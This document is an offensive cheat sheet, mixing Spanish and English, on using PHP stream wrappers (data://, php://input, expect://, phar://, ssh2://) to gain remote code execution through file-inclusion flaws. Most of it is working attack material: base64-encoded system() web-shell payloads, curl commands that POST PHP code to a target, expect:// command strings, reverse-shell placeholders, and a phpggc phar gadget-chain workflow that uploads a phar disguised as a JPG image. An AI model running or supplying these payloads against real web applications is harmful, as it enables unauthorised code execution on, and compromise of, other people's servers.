---
aliases:
  - RFI PHP Wrappers
  - 'data://'
  - 'php://input'
  - 'expect://'
  - 'phar://'
tags:
  - type/cheatsheet
  - vuln/rfi
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Remote File Inclusion (RFI)]]'
---
# RFI - PHP Wrappers y Schemes

***

## `data://` URI

| **Vector** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concept | Embed payload directly in URI; no remote server needed. | Standalone. |
| Plain text data | `?page=data://text/plain,<?php system('id'); ?>` | Standard. |
| Plain text URL-encoded | `?page=data://text/plain,%3C%3Fphp%20system('id');%20%3F%3E` | Encoded. |
| Base64 data | `?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==` | Avoid char filters. |
| Multiple lines via base64 | Encode complex multi-line PHP | Standard. |
| Reverse shell payload | `?page=data://text/plain;base64,<base64-rev-shell>` | Direct shell. |
| Other MIME types | `data://image/png,...` (rare PHP support) | Edge. |
| Combine con CSP bypass | `data://` evades external network filters | Standalone. |
| Requires `allow_url_include = On` | Same requirement as RFI | Per-config. |
| `allow_url_fopen` related | Both flags often together | Standard. |
| Avoid quotes via base64 | Encode quotes-heavy payload | Standard. |
| Combine con LFI | If LFI works pero RFI no | data:// bridges gap. |
^rfi-wrapper-data

### PoC `data://` con base64

```bash
# Encode PHP payload
PAYLOAD='<?php system($_GET["c"]); ?>'
B64=$(echo -n "$PAYLOAD" | base64)
# B64 = PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pg==

# Inject
URL="https://target/index.php?page=data://text/plain;base64,${B64}&c=id"
curl -s "$URL"
# Response: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

___

## `php://input` (POST Body)

| **Vector** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concept | Read PHP code from POST body via `php://input` | Body-based. |
| Standard usage | `?page=php://input` con body `<?php system('id'); ?>` | Two-stage. |
| Combine con curl POST | `curl -X POST -d '<?php phpinfo(); ?>' "https://target/index.php?page=php://input"` | Standard. |
| `php://stdin` alternative | Less common | Edge. |
| Bypass file upload | Avoid actual upload step | Edge. |
| Combine con base64 | Encoded body | Edge. |
| Requires `allow_url_include = On` | Same as RFI | Per-config. |
| Smaller footprint | No external server needed | Stealth. |
| Combine con limited body size | If app has size limit | Edge. |
| Multipart body trick | If app processes multipart | Edge. |
| `Content-Type` matters | `text/plain` typical | Per-stack. |
^rfi-wrapper-input

### PoC `php://input`

```bash
curl -X POST \
  -H "Content-Type: text/plain" \
  -d '<?php system($_GET["c"]); ?>' \
  "https://target/index.php?page=php://input&c=id"

# Response: uid=33(www-data) ...
```

___

## `expect://` (RCE Direct)

| **Vector** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concept | PHP `expect` extension directly executes shell command | RCE direct. |
| Standard | `?page=expect://id` | Direct RCE. |
| Multi-cmd | `?page=expect://id;whoami;hostname` | Pipe-style. |
| Reverse shell | `?page=expect://bash -c '...rev-shell...'` | Direct. |
| Requires `expect` PHP ext | Not default — installed separately | Edge. |
| Less common modern | Most apps don't have ext | Edge. |
| Combine con limited filter | If `data://` filtered, try `expect://` | Alternative. |
| `expect.allow` config | May restrict | Per-config. |
| Combine con LFI | Same chain | Adjacent. |
| Available in shared hosting | Sometimes default-installed | OSINT. |
^rfi-wrapper-expect

___

## `phar://` Deserialization Trigger

| **Vector** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concept | Phar archives contain serialized metadata. `phar://` access triggers `unserialize()` → if metadata controlled → Insecure Deserialization → RCE. | Combo vector. |
| Standard | `?page=phar://path/file.phar` | Trigger. |
| Combine con file upload | Upload Phar disguised as image | Bypass extension filter. |
| Polyglot Phar/JPG | File con valid JPG + Phar magic | Stealth. |
| Combine con LFI | LFI to upload + phar:// access | Standard chain. |
| Combine con phpggc | Generate Phar payload | Standard tooling. |
| `disable_functions` bypass | If `system()` disabled, gadget chain may still work | Compound. |
| Stream wrappers context | `phar://` is stream wrapper | Edge. |
| PHP 8 changes | Some restrictions added | Per-version. |
| Combine con local file path | `phar://` requires accessible Phar | Local. |
| Required: vulnerable class en classpath | Standard Phar chain | Per-app. |
| Disable phar wrapper | `disable_functions` doesn't catch | Limitation. |
| See `Insecure Deserialization` | Cross-ref Phar deserialization | Reference. |
^rfi-wrapper-phar

### Phar workflow

```bash
# 1. Generate phar payload
phpggc -p phar Monolog/RCE1 system "id" -o evil.phar

# 2. Upload as image (bypass ext filter)
curl -X POST -F "file=@evil.phar;filename=evil.jpg" \
  "https://target/upload"

# 3. Trigger via phar:// stream wrapper
curl -s "https://target/index.php?page=phar:///var/www/uploads/evil.jpg"
# Phar metadata unserialize → gadget chain → RCE
```

___

## `ssh2://` y Otros

| **Wrapper** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| `ssh2.shell://` | `?page=ssh2.shell://user:pass@host:port/sh.cmd` | If ssh2 ext installed. |
| `ssh2.exec://` | `?page=ssh2.exec://user:pass@host/command` | Direct command exec. |
| `ssh2.tunnel://` | Tunnel | Edge. |
| `ssh2.sftp://` | SFTP file read | Network LFI. |
| `compress.zlib://` | gzip stream | Edge. |
| `compress.bzip2://` | bzip2 stream | Edge. |
| `zip://file.zip#path` | Read inside ZIP | Path traversal en zip. |
| `glob://` | Wildcard list | List files. |
| `ogg://` | Ogg audio (rare) | Edge. |
| Custom registered streams | App may register custom | Per-app. |
| `rar://` | RAR archive (PHP RAR ext) | Edge. |
| `psm://` | PostScript metadata | Edge. |
| Other registered | `stream_get_wrappers()` lists active | Per-PHP. |
^rfi-wrapper-ssh2

### Stream wrapper enum

```php
// Atacante can probe via injected php:
<?php print_r(stream_get_wrappers()); ?>

// Output ejemplo:
// Array (
//   [0] => https
//   [1] => ftps
//   [2] => http
//   [3] => ftp
//   [4] => zip
//   [5] => compress.zlib
//   [6] => compress.bzip2
//   [7] => php
//   [8] => file
//   [9] => glob
//   [10] => data
//   [11] => phar
//   [12] => ssh2.shell
//   [13] => ssh2.exec
//   ...
// )
```

***
